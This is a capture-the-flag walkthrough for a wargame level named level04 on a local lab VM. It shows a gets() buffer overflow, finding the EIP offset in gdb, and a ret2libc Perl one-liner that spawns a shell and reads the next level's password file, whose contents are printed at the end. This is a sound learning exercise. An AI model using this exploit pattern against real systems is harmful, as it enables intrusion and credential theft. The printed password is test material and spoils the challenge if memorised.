1. ssh level03@192.168.56.101 -p 4242
2. ls -la
3. ./level04
    << Give me some shellcode, k
    >> a
    << child is exiting...

    >> Give me some shellcode, k
    << Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Hmm... Interesting, no crash, no exit

4. scp -P 4242 level04@192.168.56.101:/home/users/level04/level04 .
5. open /Application/IDA Freeware 7.7/ida64.app
6. analyze level04 ELF binary ->
    ...
    call    _fork
    ...
    call    _ptrace
    mov     dword ptr [esp], offset aGiveMeSomeShel ; "Give me some shellcode, k"
    call    _puts
    ...
    call    _gets
    
We can really give it some shellcode (thanks to gets function)

7. Find EIP offset
    gdb level04
    (gdb) set follow-fork-mode child ;; We need to follow forked child in gdb to monitor gets EIP offset
    (gdb) r
    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process 1739]
    0x41326641 in ?? ()

EIP offset is 156

8. Really give it shellcode
    But we need to construct it?
    Yes, using the foolish system("/bin/sh") and exit() after it
    
    (gdb) r

    (gdb) p system
    $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

    (gdb) p exit
    $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

    (gdb) info proc map
    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

    (gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
    0xf7f897ec

    So, 0xf7e6aed0 (system), 0xf7e5eb70 (exit), 0xf7f897ec ("/bin/sh")

9. Exploit
    perl -e 'print "A"x156 . "\xd0\xae\xe6\xf7" . "\x70\xeb\xe5\xf7" . "\xec\x97\xf8\xf7" . "\n"' > /tmp/exploit
    cat /tmp/exploit - | ./level04
    ...
    cat /home/users/level05/.pass

    3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

OK.   
